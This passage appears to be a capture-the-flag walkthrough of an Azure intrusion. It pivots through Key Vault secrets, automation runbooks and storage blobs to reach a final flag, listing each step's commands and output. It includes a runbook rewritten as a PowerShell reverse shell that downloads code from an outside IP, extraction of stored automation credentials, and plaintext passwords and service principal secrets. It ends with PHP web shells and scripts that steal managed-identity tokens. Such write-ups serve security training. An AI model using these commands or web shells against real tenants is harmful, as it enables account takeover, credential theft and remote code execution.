2ViL3NpdGVzL0ludmVudG9yeU1hbmdlbWVudC0xOTc4MjA2MjI4In0.Zm5uFdmdSe7B4zDdZJGWL1LXy4Zf8ZZ01JqLth2oFmKxj0I-S_zY99lbyneb_OQZrqvd8xWQLUj4Yx2nXELwd73PuhHrkDwme3sW7dPn3YlcSjoU4Dj1TbhhRV31AmR0Txje5OwF_ai88jmELc5ClugECGSol1lJl4_qzTFsUdNZ5L6sl71j1TSf4hnvxx8ZRGV0dDereirWcUoNc14CzpPsh6_aFexrs83Dct6OmkG3bAISDF_ZMKT5hCb_6Nz1ZrFU8pzcrdkHg01uGYAL6fQZMXHOWP55VzQ48500TfYUYJ1yZthD1F4kwqiM0P13gGuX_kvyPKRD5llehCqkbg'; Connect-AzAccount -AccessToken $token -KeyVaultAccessToken $keyvaulttoken -AccountId a0bff454-663a-4dfc-a761-5d53188abb02
```

![picture 21](images/d2d86afcf14985218cf266a9fc33a6b849385194cd2bd9052f04d51cfa0d7f80.png)  

<br/>

Get the content in the Key Vault:

```
Get-AzKeyVaultSecret -VaultName inventorycreds-19782062
```

![picture 22](images/ef2f4da99daba745113a60eed27cc08b4bbb5ebdc36e94746cf93423646cadff.png)  

- There is a secret named `RunbookAdmin`

<br/>

Get the secret value of `RunbookAdmin`:

```
Get-AzKeyVaultSecret -VaultName inventorycreds-19782062 -Name RunbookAdmin -AsPlainText
```

![picture 23](images/9b51b775ebcf1a7c98df3c270fd15b05667ed245771d9f72c39b1f8cef33f675.png)  

- Get an Azure user credential: 
  - `User6673757339746967328@defcorpspace.onmicrosoft.com` / `[C@3805dc0a`

<br/>

---

## Privilege Escalation - Access Automation Account and Stored Credentials

<br/>

| **Tactic** | **Technique** | **Tool** | **Description** |
| --- | --- | --- | --- |
| Privilege Escalation | T1078.004 - Valid Accounts: Cloud Accounts | Azure Portal | Use the valid account stored in Key Vault to access Azure Cloud Portal | 
| Discovery | T1526 - Cloud Service Discovery | Azure Portal, Az PowerShell | Check accessible Azure resources using Az PowerShell and enumerate credential objects on Azure Portal |


<br/>

Use the obtained credential in the Key Vault to access Azure using Azure AD module:

```
$passwd = ConvertTo-SecureString '[C@3805dc0a' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('User6673757339746967328@defcorpspace.onmicrosoft.com', $passwd); Connect-AzureAD -Credential $creds
```

![picture 25](images/36723c92ba63dd5d4757997a4c4b32c4ecf3bed3849f0d3b92df0eadafa09b5e.png)  

- Tenant ID: `15e43385-64db-4b74-a18b-d167ec5ef191`

<br/>

Connect to Azure Portal using the credential:

![picture 38](images/64188d22d7e0515d33eb2841169db663315fb474708cb95481659cc65b20d231.png)  

- Subscription ID: `2b45e216-b3fd-4902-bf85-406b8bf5d46e`
- Domain: `defcorpspace.onmicrosoft.com`
- Directory: `DefCorp Space Research Group`

<br/>

Connect using Az Powershell:

```
$passwd = ConvertTo-SecureString '[C@3805dc0a' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('User6673757339746967328@defcorpspace.onmicrosoft.com', $passwd); Connect-AzAccount -Credential $creds -Tenant 15e43385-64db-4b74-a18b-d167ec5ef191
```

![picture 26](images/6cefc8a61386da3711f1f789a20a60cc080c0d0a351c3dc14d9fed266f1e6df5.png)  

<br/>

Enumerate accessible resources:

```
Get-AzResource
```

![picture 27](images/891bd4d73cb04dab3f69241e6cb4f9528796e95cf7e963654d4cbd04c659296b.png)  

- The user has the access to `automationAccounts` and its runbook.
  - Automation account ResourceId: `/subscriptions/2b45e216-b3fd-4902-bf85-406b8bf5d46e/resourceGroups/3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de/providers/Microsoft.Automation/automationAccounts/backupautomation-1978206228366054214`
  - AdminRunbook ResourceId: `/subscriptions/2b45e216-b3fd-4902-bf85-406b8bf5d46e/resourceGroups/3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de/providers/Microsoft.Automation/automationAccounts/backupautomation-1978206228366054214/runbooks/AdminRunbook`

<br/>

Export the current runbook content:

```
Export-AzAutomationRunbook -ResourceGroupName 3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de -AutomationAccountName backupautomation-1978206228366054214 -Name AdminRunbook -OutputFolder ~\Desktop
```

![picture 28](images/c8fd4bb0c54a655a6e7893ccd5f710e7c10af529e4bc624fb73ee41c3c487f83.png)  

![picture 29](images/fcc07b898782fbd722e8b63ed92d58f9e004388f00d5e8df5f3d444ce68d3e97.png)  


- Content of the current runbook `AdminRunbook.ps1`:

```
hostname
```

<br/>

Replace the content of the Runbook `AdminRunbook.ps1` with the following:

```
powershell "IEX (New-Object Net.Webclient).downloadstring('http://104.215.192.25/Invoke-PowerShellTcp.ps1');reverse -Reverse -IPAddress 104.215.192.25 -Port 4444"
```

![picture 30](images/b540a7a31cf89d89122dfce25f202ba4328ff92967671b984b0c42f15ef02996.png)  

<br/>

Import and Publish the updated runbook:

```
Import-AzAutomationRunbook -ResourceGroupName 3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de -AutomationAccountName backupautomation-1978206228366054214 -Name AdminRunbook -Path ~\Desktop\AdminRunBook.ps1 -Type PowerShell -Force -Verbose

Publish-AzAutomationRunbook -ResourceGroupName 3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de -AutomationAccountName backupautomation-1978206228366054214 -RunbookName AdminRunbook -Verbose
```

![picture 31](images/a6fe87d1a5fd36c0a45ca3566d416495c53dc5b7f0ad44af4d15551fbe593bb8.png)  

![picture 32](images/fa4fb0e5b815c5b564e0aea7641193a4b9672a9151ac04f44b8696f4c7ba4e30.png)  

<br/>

Execute the runbook:

```
Start-AzAutomationRunbook -ResourceGroupName 3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de -AutomationAccountName backupautomation-1978206228366054214 -RunbookName AdminRunbook -Verbose
```

![picture 33](images/179d5e86d22cafb30ecd559c30bb82157bd6586a466801e1af01c540e28a6079.png)  

- No callback

<br/>

Try to change the IP address to be the internal IP `10.4.0.4` in the runbook `AdminRunbook.ps1` and run through the above steps again:

- No callback

<br/>

Instead, try login Azure portal as `User6673757339746967328@defcorpspace.onmicrosoft.com`. Check the first runbook:

![picture 39](images/a943aa9a2857c58874ae779fcc0bbee0011488320a4f2e791bbda2b49a27b2f3.png)  

![picture 40](images/d2b113c10207c79a9e5db2d32f0a73ab871228ef717005cb03d8fb61dd62df04.png)  

- Found a command for getting

<br/>

Check the job output / error in the previously executed jobs:

![picture 34](images/5a5639dab34437454d9ddd9433d7cdbd5a91c3012e67ffd5d882f7db24a74df5.png)  

- `powershell` is not recognized

<br/>

Modify `AdminRunbook.ps1`, import, publish and execute the runbook again:

- Content:
```
cmd /c set
```

- Run:

```
Import-AzAutomationRunbook -ResourceGroupName 3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de -AutomationAccountName backupautomation-1978206228366054214 -Name AdminRunbook -Path ~\Desktop\AdminRunBook.ps1 -Type PowerShell -Force; Publish-AzAutomationRunbook -ResourceGroupName 3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de -AutomationAccountName backupautomation-1978206228366054214 -RunbookName AdminRunbook -Verbose; Start-AzAutomationRunbook -ResourceGroupName 3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de -AutomationAccountName backupautomation-1978206228366054214 -RunbookName AdminRunbook -Verbose
```

![picture 35](images/95c1233cbc2144142a24e326d83889595aad92756046c1b786b0f154a59f4349.png)  

- Checking the output on Azure portal:

![picture 36](images/9b302d090ad8a11361f2861640b22b41116c07f27d1e520daef9f4f4285c7c50.png)  

<br/>

Try to obtain the AutomationPSCredential by using the following commands in the runbook:

```
$creds = Get-AutomationPSCredential -Name 'creds'; 
$creds.GetNetworkCredential() | fl *
```

- Checking the output on Azure Portal:

![picture 37](images/074392947d78b621e74dcea49cdb99175dea057886c63f872700f8698207fac8.png)  

- Obtained a user credential:  `storageuser` / `S$$3ureS7o$aG3pAss6W@DT`
- It looks like the automation account can access storage resources (blob)

<br/>

Checking the Credentials on Azure portal, there is another one associated with the username `User3769563720055157779@defcorpspace.onmicrosoft.com`:

![picture 41](images/767dda8108ebe00c8f60b7eb924babee27f3329e0f1e4becb8da15f7cac55271.png)  

Try to obtain the credential as well by using this Runbook:

```
$creds = Get-AutomationPSCredential -Name 'credential'; 
$creds.GetNetworkCredential() | fl *
```

![picture 42](images/7eada8560587cf43f7507a6a8f340a1aac33cfd7cafef2bb9374c5bb058d1f44.png)  

- Obtained an other credential:  `User3769563720055157779@defcorpspace.onmicrosoft.com` / `[C@7042f0c3`

<br/>

Try to sign in using Azure Portal:

![picture 44](images/2ce81ef0118acc9d032e77f783719cf8e57049028d3505842dd416c1c3627e6f.png)  

- Login successfully

<br/>

---

## Privilege Escalation - Get cleartext secret in blob epbackup-space as User3769563720055157779

<br/>

| **Tactic** | **Technique** | **Tool** | **Description** |
| --- | --- | --- | --- |
| Privilege Escalation | T1078.004 - Valid Accounts: Cloud Accounts | Azure Portal, Az PowerShell | Use the valid account stored in Key Vault to access Azure Cloud Portal 
| Discovery | T1526 - Cloud Service Discovery | Az PowerShell | Enumerate accessible resources using Az PowerShell |
| Collection | T1530 - Data from Cloud Storage Object | Azure Storage Explorer | As User3769563720055157779, access the storage blob (epbackup-space) to obtain a manifest file, where cleartext credential of a managed identity is found |

<br/>

Connect using Az Powershell & the newly obtained credential:

```
$passwd = ConvertTo-SecureString '[C@7042f0c3' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('User3769563720055157779@defcorpspace.onmicrosoft.com', $passwd); Connect-AzAccount -Credential $creds -Tenant 15e43385-64db-4b74-a18b-d167ec5ef191
```

![picture 45](images/1b7a69fbb32c06ccd89bbd8272c3179b883738bc55008d330bac2b89f0ca4fca.png)  

<br/>

Enumerate accessible resources:

```
Get-AzResource
```

![picture 46](images/2ef6922d9797a14deb9a2a79a5f29bb29ff13c57edbe9fc1f49621c4acbf4f74.png)  

- `User3769563720055157779` is able to access the Storage Account `epbackup1978206228`

<br/>

Using **Azure Storage Explorer** to check the blob:

![picture 48](images/ae590825f1a2af8fd1ef62b0331761030c82daa67cb4b8d8b4a3ed528dc7be2e.png)  

- Found `manifest.txt` in the blob `epbackup-space`

<br/>

Checking the content of `manifest.txt`, a cleartext credential related to `HelperApp_c44ae38fd5c521f408e413a23773ab9f4b497a137473bb146372d7e340006b7d` is found in `passwordCredentials`:

![picture 49](images/05296585b20ee6ca79c2c88f90b1c548daa3dbc6fdf6808049d71e97d36eabe5.png)  

- Object ID: `a2d18188-f864-4eb1-a21d-029f553b76e1`
- App ID: `16b6a33e-0d2b-456d-96fb-cbfce4c6000c`
- App: `HelperApp_c44ae38fd5c521f408e413a23773ab9f4b497a137473bb146372d7e340006b7d`
- Key ID: `f12b7693-1aec-490b-b455-16f54c39bc23`
- Value: `sk.B.o1Lu3R-OJBf4VWDi~G-JWm952gKh5`

<br/>

---

## Privilege Escalation - Get cleartext secret in blob epbackup-space as Helper App's Managed Identity

<br/>

| **Tactic** | **Technique** | **Tool** | **Description** |
| --- | --- | --- | --- |
| Privilege Escalation | T1078.004 - Valid Accounts: Cloud Accounts | Az PowerShell | Use the valid App Managed Identity secret found to access another Blob |
| Discovery | T1526 - Cloud Service Discovery | Az PowerShell | Enumerate accessible resources using Az PowerShell |
| Collection | T1530 - Data from Cloud Storage Object | Azure Storage Explorer | As Helper App managed identity, access the storage blob (epbackup-planetary) to obtain a manifest file, where cleartext credential of a managed identity of another tenant is found |

<br/>

Login using the Service Principal obtained:

```
$passwd = ConvertTo-SecureString 'sk.B.o1Lu3R-OJBf4VWDi~G-JWm952gKh5' -AsPlainText -Force; $pscredential = New-Object -TypeName System.Management.Automation.PSCredential("16b6a33e-0d2b-456d-96fb-cbfce4c6000c", $passwd); Connect-AzAccount -ServicePrincipal -Credential $pscredential -Tenant 15e43385-64db-4b74-a18b-d167ec5ef191
```

![picture 50](images/43aed03cb86735f04aae88edbfccce2eb5ab044f309b6cc5b94968e2fb1b65e4.png)  

<br/>

Enumerate Azure resources:

```
Get-AzResource
```

![picture 51](images/ac0cd55b88d5017d9b42b13954b155278bcea5a6253c522f947d84b7911b8a70.png)  

```
Name              : epbackup1978206228
ResourceGroupName : 3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de
ResourceType      : Microsoft.Storage/storageAccounts
Location          : southeastasia
ResourceId        : /subscriptions/2b45e216-b3fd-4902-bf85-406b8bf5d46e/resourceGroups/3144ce792dfd350a968e15f9e43ec199cd94b42be1c335
                    71d5750cc6243bc5de/providers/Microsoft.Storage/storageAccounts/epbackup1978206228
```

<br/>

Enumerate the Storage Account Containers:

```
$storageAcc = Get-AzStorageAccount -ResourceGroupName 3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de -Name epbackup1978206228; $ctx = $storageAcc.Context; Get-AzStorageContainer -Context $ctx; 
```

![picture 52](images/d910fa07b0403e69b4f6592db8d9fb065624b26962537b0f21dd666c8ffae4b6.png)  

- Same result as previous
- Note we do not get the access of `epbackup-planetary` using User3769563720055157779's credential

<br/>

Check the container `epbackup-planetary`:


```
$storageAcc = Get-AzStorageAccount -ResourceGroupName 3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de -Name epbackup1978206228; $ctx = $storageAcc.Context; Get-AzStorageBlob -Container epbackup-planetary -Context $ctx
```

![picture 53](images/48c1a2bcc86c2b7c5f6bcf809cbd72954c442c46647457b94f501d6735b7d71a.png)  

- The Service Principal can access `epbackup-planetary`, which contains a file `manifest.txt`

<br/>

Get the file content of `manifest.txt`:

```
$storageAcc = Get-AzStorageAccount -ResourceGroupName 3144ce792dfd350a968e15f9e43ec199cd94b42be1c33571d5750cc6243bc5de -Name epbackup1978206228; $ctx = $storageAcc.Context; Get-AzStorageBlob -Container epbackup-planetary -Context $ctx | Get-AzStorageBlobContent
```

![picture 54](images/1bd0fc0fd4544ba7ca281b7bf6574a0d7f609773e8d0f47460f33ab06b0ee3db.png)  

<br/>

Check the file content of `manifest.txt`:

![picture 55](images/95cffd3270748da9e7f36a320b3a3eb7862b2c41500e03fd652e3babdbc51e3e.png)  

- Object ID: `73efec72-7757-4978-88de-646aa001c98a`
- Azure Domain: `defcorpplanetary.onmicrosoft.com`
- App ID: `f2381716-b286-4605-a2f7-1234f8019631`
- App Name: `UserApp_c44ae38fd5c521f408e413a23773ab9f4b497a137473bb146372d7e340006b7d`
- Key ID: `c888f80c-e7a0-476f-a7cc-f3059c61b159`
- Secret: `aaZo83_9d69v1S1~47mft2qWg8l~~n_bY.`
  
<br/>

---

## Actions on Objectives - Access final flag in the Key Vault as the Managed Identity of UserApp

<br/>

| **Tactic** | **Technique** | **Tool** | **Description** |
| --- | --- | --- | --- |
| Privilege Escalation | T1078.004 - Valid Accounts: Cloud Accounts | Az PowerShell | Use the valid App Managed Identity secret found to access Key Vault in another tenant |
| Discovery | T1526 - Cloud Service Discovery | Az PowerShell | Enumerate accessible resources using Az PowerShell |
| Collection | T1530 - Data from Cloud Storage Object | Az PowerShell | As UserApp App managed identity, access the Key Vault planetary-43556228109789
to obtain the secret value of finalflag-fprime, which contains the final flag  |

<br/>

To get the tenant ID of `defcorpplanetary.onmicrosoft.com`, make the following request using a browser:
- http://login.microsoftonline.com/defcorpplanetary.onmicrosoft.com/.well-known/openid-configuration

![picture 56](images/190e947a96917e93b623cdae4957d866abd2f9d4aa27e6e96ae4d94d721c4b44.png)  

- Tenant ID: `4e7a1151-36d0-457e-b489-729cf0fb315a`

<br/>

Login using the Service Principal obtained:

```
$passwd = ConvertTo-SecureString 'aaZo83_9d69v1S1~47mft2qWg8l~~n_bY.' -AsPlainText -Force; $pscredential = New-Object -TypeName System.Management.Automation.PSCredential("f2381716-b286-4605-a2f7-1234f8019631", $passwd); Connect-AzAccount -ServicePrincipal -Credential $pscredential -Tenant 4e7a1151-36d0-457e-b489-729cf0fb315a
```

![picture 57](images/be8871f2ad867e535f896758a388a03c59b1abb6dc03ceca742bd1999541a720.png)  

<br/>

Enumerate the accessible resources:

```
Get-AzResource
```

![picture 58](images/5c0ce42eed125cfb1996145374a5c4c6beae413f7402190ba6535742a803e322.png)  

- The service principal has access to the Azure Key Vault `planetary-43556228109789`

```
Name              : planetary-43556228109789
ResourceGroupName : a384a003b935e93c6d8716295e0a9a805f45411e91bbbc7c6890d968212fa1b8
ResourceType      : Microsoft.KeyVault/vaults
Location          : southeastasia
ResourceId        : /subscriptions/9ffd50de-f6f0-4a59-abd6-8e9288bdc20d/resourceGroups/a384a003b935e93c6d8716295e0a9a805f45411e91bbbc
                    7c6890d968212fa1b8/providers/Microsoft.KeyVault/vaults/planetary-43556228109789
```

<br/>

Get the Key in the Key Vault:

```
Get-AzKeyVaultSecret -VaultName planetary-43556228109789
```

![picture 59](images/798177ddea5f9cc2a51bfb7a84704fa7f989ad6318b3ba988d87f48a009df859.png)  

- There is a secret called `finalflag-fprime`

<br/>

Get the secret value of `finalflag-fprime`:

```
Get-AzKeyVaultSecret -VaultName planetary-43556228109789 -Name finalflag-fprime -AsPlainText
```

![picture 60](images/3cbba7d2221ece2876b30ce2cfe3fc342a9cef75e2ea6f0473dfa93347982a5a.png)  

- Get a value: `secvl4355622810978971271`
- As indicated by the Secret name `finalflag-fprime`, this is the final flag

<br/>

---

## Tools

<br/>

| **Tool Name** | **Usage** | **URL** |
| --- | --- | --- |
| simple-webshell.phtml | A webshell for Remote Code Execution | The source code is in the **References** section. |
| get-token.phtml | A webshell for getting the managed identity access token | The source code is in the **References** section. |
| Az PowerShell | PowerShell module for accessing Azure | https://docs.microsoft.com/en-us/powershell/azure/install-az-ps?view=azps-5.9.0 |
| Python 3.9 | To run Python script / tools | https://www.python.org/downloads/ |
| Azure Storage Explorer | To browse Azure blob storage | https://azure.microsoft.com/en-us/features/storage-explorer/ | 

<br/>

---

## References

### simple-webshell.phtml

```
<?php 

system($_REQUEST['cmd']);

?>
```

<br/>

### get-token.phtml

```
<?php 

system('curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

?>
```

<br/>

### get-keyvault-token.phtml

```
<?php 

system('curl "$IDENTITY_ENDPOINT?resource=https://vault.azure.net&api-version=2017-09-01" -H secret:$IDENTITY_HEADER');

?>
```

<br/>

